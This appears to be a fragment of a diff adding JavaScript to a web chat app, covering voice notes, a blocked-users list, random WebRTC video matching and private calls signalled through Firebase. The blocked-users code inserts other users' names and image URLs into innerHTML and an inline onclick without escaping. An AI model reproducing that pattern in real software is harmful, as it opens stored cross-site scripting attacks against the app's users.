+                micBtn.style.color = "#22c55e"; 
+            } catch(e) { 
+                alert("Microphone access denied. Please allow audio permission."); 
+            }
+        }
+        
+        function stopVoiceRecord(e) { 
+            e.preventDefault(); 
+            if(mediaRecorder && mediaRecorder.state === "recording") { 
+                mediaRecorder.stop(); 
+                micBtn.style.color = "#ef4444"; 
+            } 
+        }
+
+        window.openBlockedList = () => {
+            document.getElementById('blocked-modal').style.display = 'flex';
+            let listDiv = document.getElementById('blocked-users-list'); 
+            listDiv.innerHTML = '<p style="text-align:center; color:var(--text-muted);">Fetching list...</p>';
+            
+            db.ref(`users/${currentUser.uid}/blocked`).once('value').then(snap => {
+                listDiv.innerHTML = '';
+                if(snap.exists()){
+                    snap.forEach(child => {
+                        db.ref('users/' + child.key).once('value').then(uSnap => {
+                            let bUser = uSnap.val();
+                            listDiv.innerHTML += `
+                                <div class="user-item" style="padding:15px;">
+                                    <img src="${bUser.pfp}" style="width:45px;height:45px;">
+                                    <div class="user-details"><h4>${bUser.name}</h4></div>
+                                    <button class="btn-secondary" onclick="db.ref('users/${currentUser.uid}/blocked/${bUser.uid}').remove().then(()=>openBlockedList())" style="width:auto; padding:8px 15px; font-size:0.85rem; border-color:#ef4444; color:#ef4444;">Unblock</button>
+                                </div>
+                            `;
+                        });
+                    });
+                } else { 
+                    listDiv.innerHTML = '<p style="text-align:center; color:var(--text-muted); padding:20px;">No blocked users found.</p>'; 
+                }
+            });
+        };
+
+        // ==========================================
+        // 🌟 WEBRTC: GLOBAL RANDOM VIDEO CHAT
+        // ==========================================
+        const rtcServers = { 
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' }, 
+                { urls: 'stun:stun1.l.google.com:19302' }, 
+                { urls: 'stun:stun.services.mozilla.com' }, 
+                { urls: 'stun:global.stun.twilio.com:3478' }
+            ] 
+        };
+
+        let globalLocalStream, globalPeerConn, globalRoomRef = null;
+        let isGlobalActive = false, isGlobalSkipping = false;
+        let globalIceQueue = [];
+
+        async function startRandomVideoChat() {
+            document.getElementById('video-chat-screen').classList.add('slide-in');
+            document.getElementById('video-status').innerText = "Requesting camera access...";
+            isGlobalActive = true; 
+            isGlobalSkipping = false;
+
+            try {
+                globalLocalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const localVid = document.getElementById('local-video');
+                localVid.srcObject = globalLocalStream;
+                localVid.play().catch(e => console.log(e));
+                findRandomMatch();
+            } catch (error) {
+                alert("Camera or Microphone permission is required for Video Chat!");
+                endVideoChat();
+            }
+        }
+
+        async function findRandomMatch() {
+            if(!isGlobalActive) return;
+            
+            document.getElementById('video-status').innerText = "Searching the globe for a match...";
+            document.getElementById('remote-video').srcObject = null;
+            globalIceQueue = [];
+            
+            if (globalPeerConn) globalPeerConn.close();
+            if (globalRoomRef) { 
+                globalRoomRef.off(); 
+                globalRoomRef.remove(); 
+            }
+            
+            globalPeerConn = new RTCPeerConnection(rtcServers);
+            globalLocalStream.getTracks().forEach(track => globalPeerConn.addTrack(track, globalLocalStream));
+            
+            globalPeerConn.ontrack = (event) => {
+                const remoteVid = document.getElementById('remote-video');
+                if(!remoteVid.srcObject) remoteVid.srcObject = new MediaStream();
+                remoteVid.srcObject.addTrack(event.track);
+                remoteVid.play().catch(e => console.log(e));
+                document.getElementById('video-status').innerText = ""; 
+            };
+
+            const queueRef = db.ref('video_queue');
+            const snapshot = await queueRef.once('value');
+            let matchFound = false;
+
+            if (snapshot.exists()) {
+                snapshot.forEach(child => {
+                    const roomData = child.val();
+                    if (child.key !== currentUser.uid && roomData.status === 'waiting' && roomData.offer) { 
+                        matchFound = true;
+                        joinGlobalRoom(child.key, roomData.offer); 
+                        return true; 
+                    }
+                });
+            }
+
+            if (!matchFound) {
+                createGlobalRoom();
+            }
+        }
+
+        async function createGlobalRoom() {
+            const offer = await globalPeerConn.createOffer();
+            await globalPeerConn.setLocalDescription(offer);
+
+            globalRoomRef = db.ref('video_queue/' + currentUser.uid);
+            globalRoomRef.onDisconnect().remove();
+
+            await globalRoomRef.set({ 
+                status: 'waiting', 
+                offer: { type: offer.type, sdp: offer.sdp } 
+            });
+            
+            globalRoomRef.child('calleeCandidates').on('child_added', snap => {
+                if(snap.val()) {
+                    let candidate = new RTCIceCandidate(snap.val());
+                    if(globalPeerConn.remoteDescription) {
+                        globalPeerConn.addIceCandidate(candidate);
+                    } else {
+                        globalIceQueue.push(candidate);
+                    }
+                }
+            });
+
+            globalPeerConn.onicecandidate = event => {
+                if (event.candidate) {
+                    globalRoomRef.child('callerCandidates').push(event.candidate.toJSON());
+                }
+            };
+
+            globalRoomRef.on('value', async snap => {
+                const data = snap.val();
+                if (!data || data.status === 'skipped') {
+                    skipAndFindNew();
+                }
+                if (data && data.answer && !globalPeerConn.currentRemoteDescription) {
+                    await globalPeerConn.setRemoteDescription(new RTCSessionDescription(data.answer));
+                    globalIceQueue.forEach(c => globalPeerConn.addIceCandidate(c)); 
+                    globalIceQueue = [];
+                }
+            });
+        }
+
+        async function joinGlobalRoom(partnerUid, partnerOffer) {
+            globalRoomRef = db.ref('video_queue/' + partnerUid);
+            globalRoomRef.onDisconnect().update({ status: 'skipped' });
+            await globalRoomRef.update({ status: 'connected' });
+
+            await globalPeerConn.setRemoteDescription(new RTCSessionDescription(partnerOffer));
+            const answer = await globalPeerConn.createAnswer();
+            await globalPeerConn.setLocalDescription(answer);
+            
+            await globalRoomRef.update({ answer: { type: answer.type, sdp: answer.sdp } });
+
+            globalPeerConn.onicecandidate = event => {
+                if (event.candidate) {
+                    globalRoomRef.child('calleeCandidates').push(event.candidate.toJSON());
+                }
+            };
+
+            globalRoomRef.child('callerCandidates').on('child_added', snap => {
+                if(snap.val()) {
+                    globalPeerConn.addIceCandidate(new RTCIceCandidate(snap.val()));
+                }
+            });
+
+            globalRoomRef.on('value', snap => {
+                const data = snap.val();
+                if (!data || data.status === 'skipped') {
+                    skipAndFindNew();
+                }
+            });
+        }
+
+        window.skipAndFindNew = () => {
+            if(isGlobalSkipping) return; 
+            isGlobalSkipping = true;
+            
+            if (globalRoomRef) { 
+                globalRoomRef.update({ status: 'skipped' }); 
+                globalRoomRef.off(); 
+                globalRoomRef.remove(); 
+            }
+            
+            setTimeout(() => { 
+                isGlobalSkipping = false; 
+                findRandomMatch(); 
+            }, 600);
+        }
+
+        window.endVideoChat = () => {
+            isGlobalActive = false; 
+            isGlobalSkipping = false;
+            
+            if (globalRoomRef) { 
+                globalRoomRef.update({ status: 'skipped' }); 
+                globalRoomRef.off(); 
+                globalRoomRef.remove(); 
+            }
+            if (globalPeerConn) globalPeerConn.close();
+            if (globalLocalStream) globalLocalStream.getTracks().forEach(track => track.stop()); 
+            
+            document.getElementById('video-chat-screen').classList.remove('slide-in');
+        };
+
+        // ==========================================
+        // 📞 WEBRTC: PRIVATE AUDIO/VIDEO CALLS
+        // ==========================================
+        let pvtLocalStream, pvtPeerConn, pvtCallRef = null;
+        let callTimerInterval = null, callSeconds = 0;
+        let privateIceQueue = [];
+
+        function startCallTimer() {
+            callSeconds = 0;
+            document.getElementById('pvt-call-timer').style.display = 'block';
+            document.getElementById('pvt-call-timer').innerText = "00:00";
+            callTimerInterval = setInterval(() => {
+                callSeconds++;
+                let m = Math.floor(callSeconds / 60); 
+                let s = callSeconds % 60;
+                document.getElementById('pvt-call-timer').innerText = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
+            }, 1000);
+        }
+
+        function stopCallTimer() {
+            clearInterval(callTimerInterval);
+            document.getElementById('pvt-call-timer').style.display = 'none';
+        }
+
+        function listenForIncomingCalls() {
+            db.ref('calls/' + currentUser.uid).off(); 
+            db.ref('calls/' + currentUser.uid).on('value', snap => {
+                const data = snap.val();
+                if(data && data.status === 'ringing') {
+                    playSound('ring');
+                    document.getElementById('incoming-caller-name').innerText = data.callerName; 
+                    document.getElementById('incoming-caller-pfp').src = data.callerPfp; 
+                    document.getElementById('incoming-call-type').innerText = data.type === 'video' ? 'Video' : 'Audio'; 
+                    document.getElementById('incoming-call-modal').style.display = 'flex';
+                } else if(!data || data.status === 'ended' || data.status === 'rejected') {
+                    stopSound(); 
+                    document.getElementById('incoming-call-modal').style.display = 'none'; 
+                    if(pvtPeerConn && data?.status === 'ended') endPrivateCallUI("Call Ended");
+                }
+            });
+        }
+
+        window.initPrivateCall = async (type) => {
+            if(isMeBlocked || isThemBlocked) return alert("Calling is disabled due to block settings.");
+            
+            document.getElementById('private-video-screen').style.display = 'flex'; 
+            document.getElementById('pvt-video-status').innerText = "Calling " + document.getElementById('active-chat-name').innerText + "..."; 
+            
+            document.getElementById('pvt-audio-avatar').style.display = type === 'audio' ? 'block' : 'none'; 
+            if(type === 'audio') document.getElementById('pvt-audio-avatar').src = document.getElementById('active-chat-pfp').src;
+            
+            try {
+                // Ensure audio is true and video is properly toggled based on call type
+                pvtLocalStream = await navigator.mediaDevices.getUserMedia({ video: type === 'video', audio: true });
+                
+                const localVid = document.getElementById('pvt-local-video'); 
+                localVid.srcObject = pvtLocalStream; 
+                localVid.play().catch(e=>console.log(e)); 
+                localVid.style.display = type === 'video' ? 'block' : 'none';
+                
+                privateIceQueue = []; 
+                pvtPeerConn = new RTCPeerConnection(rtcServers); 
+                pvtLocalStream.getTracks().forEach(track => pvtPeerConn.addTrack(track, pvtLocalStream));
+                
+                pvtPeerConn.ontrack = (event) => {
+                    const remoteVid = document.getElementById('pvt-remote-video');
+                    if(!remoteVid.srcObject) remoteVid.srcObject = new MediaStream();
+                    remoteVid.srcObject.addTrack(event.track);
+                    remoteVid.play().catch(e=>console.log(e));
+                    remoteVid.style.display = type === 'video' ? 'block' : 'none';
+                    
+                    document.getElementById('pvt-video-status').innerText = "";
+                    if(callSeconds === 0) startCallTimer();
+                };
+                
+                pvtCallRef = db.ref('calls/' + currentChatFriendId); 
+                pvtCallRef.onDisconnect().remove();
+                
+                const offer = await pvtPeerConn.createOffer(); 
+                await pvtPeerConn.setLocalDescription(offer);
+                
+                await pvtCallRef.set({ 
+                    callerUid: currentUser.uid, 
+                    callerName: currentUser.name, 
+                    callerPfp: currentUser.pfp, 
+                    type: type, 
+                    status: 'ringing', 
+                    offer: { type: offer.type, sdp: offer.sdp } 
+                });
+                
+                pvtCallRef.child('calleeCandidates').on('child_added', snap => {
+                    if(snap.val()) {
+                        let candidate = new RTCIceCandidate(snap.val());
+                        if(pvtPeerConn.remoteDescription) pvtPeerConn.addIceCandidate(candidate);
+                        else privateIceQueue.push(candidate);
+                    }
+                });
+                
+                pvtPeerConn.onicecandidate = e => { 
+                    if(e.candidate) pvtCallRef.child('callerCandidates').push(e.candidate.toJSON()); 
+                };
+                
+                pvtCallRef.on('value', async snap => {
+                    const data = snap.val();
+                    if(!data) endPrivateCallUI("Call Ended");
+                    else if(data.status === 'rejected') endPrivateCallUI("Call Rejected");
+                    else if(data.status === 'answered' && data.answer && !pvtPeerConn.currentRemoteDescription) {
+                        document.getElementById('pvt-video-status').innerText = "Connecting...";
+                        await pvtPeerConn.setRemoteDescription(new RTCSessionDescription(data.answer));
+                        privateIceQueue.forEach(c => pvtPeerConn.addIceCandidate(c)); 
+                        privateIceQueue = [];
+                    }
+                });
+                
+            } catch(e) { 
+                alert("Microphone/Camera permission is blocked!"); 
+                endPrivateCallUI(); 
+            }
+        };
+
+        window.acceptPrivateCall = async () => {
+            stopSound(); 
+            document.getElementById('incoming-call-modal').style.display = 'none'; 
+            document.getElementById('private-video-screen').style.display = 'flex';
+            
+            pvtCallRef = db.ref('calls/' + currentUser.uid); 
+            const snap = await pvtCallRef.once('value'); 
+            const data = snap.val(); 
+            
+            if(!data) return endPrivateCallUI();
+
+            document.getElementById('pvt-video-status').innerText = "Connecting..."; 
+            document.getElementById('pvt-audio-avatar').style.display = data.type === 'audio' ? 'block' : 'none'; 
+            if(data.type === 'audio') document.getElementById('pvt-audio-avatar').src = data.callerPfp;
+            
+            try {
+                // Ensure audio is true and video is dynamically toggled
+                pvtLocalStream = await navigator.mediaDevices.getUserMedia({ video: data.type === 'video', audio: true }); 
+                
+                const localVid = document.getElementById('pvt-local-video'); 
+                localVid.srcObject = pvtLocalStream; 
+                localVid.play().catch(e=>console.log(e)); 
+                localVid.style.display = data.type === 'video' ? 'block' : 'none';
+                
+                privateIceQueue = []; 
+                pvtPeerConn = new RTCPeerConnection(rtcServers); 
+                pvtLocalStream.getTracks().forEach(track => pvtPeerConn.addTrack(track, pvtLocalStream));
+                
+                pvtPeerConn.ontrack = (event) => {
+                    const remoteVid = document.getElementById('pvt-remote-video');
+                    if(!remoteVid.srcObject) remoteVid.srcObject = new MediaStream();
+                    remoteVid.srcObject.addTrack(event.track);
+                    remoteVid.play().catch(e=>console.log(e));
+                    remoteVid.style.display = data.type === 'video' ? 'block' : 'none';
+                    
+                    document.getElementById('pvt-video-status').innerText = "";
+                    if(callSeconds === 0) startCallTimer();
+                };
+                
+                pvtCallRef.onDisconnect().remove();
+                
+                await pvtPeerConn.setRemoteDescription(new RTCSessionDescription(data.offer)); 
+                const answer = await pvtPeerConn.createAnswer(); 
+                await pvtPeerConn.setLocalDescription(answer);
+                
+                await pvtCallRef.update({ 
+                    status: 'answered', 
+                    answer: { type: answer.type, sdp: answer.sdp } 
+                });
+                
+                pvtPeerConn.onicecandidate = e => { 
+                    if(e.candidate) pvtCallRef.child('calleeCandidates').push(e.candidate.toJSON()); 
+                };
+                
+                pvtCallRef.child('callerCandidates').on('child_added', s => { 
+                    if(s.val()) { 
+                        let candidate = new RTCIceCandidate(s.val()); 
+                        if(pvtPeerConn.remoteDescription) pvtPeerConn.addIceCandidate(candidate); 
+                        else privateIceQueue.push(candidate); 
+                    } 
+                });
+            } catch(e) { 
+                alert("Permission denied to use camera or microphone."); 
+                rejectPrivateCall(); 
+            }
+        };
+
+        window.rejectPrivateCall = () => {
+            stopSound(); 
+            document.getElementById('incoming-call-modal').style.display = 'none'; 
+            if(pvtCallRef) { 
+                pvtCallRef.update({ status: 'rejected' }); 
+                setTimeout(() => pvtCallRef.remove(), 2000); 
+            } else { 
+                db.ref('calls/' + currentUser.uid).update({ status: 'rejected' }); 
+                setTimeout(() => db.ref('calls/' + currentUser.uid).remove(), 2000); 
+            }
+        };
+
+        window.endPrivateCall = () => {
+            if(pvtCallRef) pvtCallRef.update({ status: 'ended' }); 
+            setTimeout(() => { 
+                if(pvtCallRef) pvtCallRef.remove(); 
+                endPrivateCallUI(); 
+            }, 1000);
+        };
+
+        function endPrivateCallUI(msg) {
+            stopCallTimer();
+            if(msg) {
+                document.getElementById('pvt-video-status').innerText = msg;
+                setTimeout(closePrivateUI, 1500);
+            } else { 
+                closePrivateUI(); 
+            }
+        }
+
+        function closePrivateUI() {
+            document.getElementById('private-video-screen').style.display = 'none';
+            document.getElementById('pvt-audio-avatar').style.display = 'none';
+            if(pvtPeerConn) { pvtPeerConn.close(); pvtPeerConn = null; }
+            if(pvtLocalStream) { pvtLocalStream.getTracks().forEach(t => t.stop()); pvtLocalStream = null; }
+            if(pvtCallRef) { pvtCallRef.off(); pvtCallRef = null; }
+            document.getElementById('pvt-remote-video').srcObject = null;
+            document.getElementById('pvt-local-video').srcObject = null;
+        }
+
+    </script>
 </body>
-    </html>
-    
+</html>
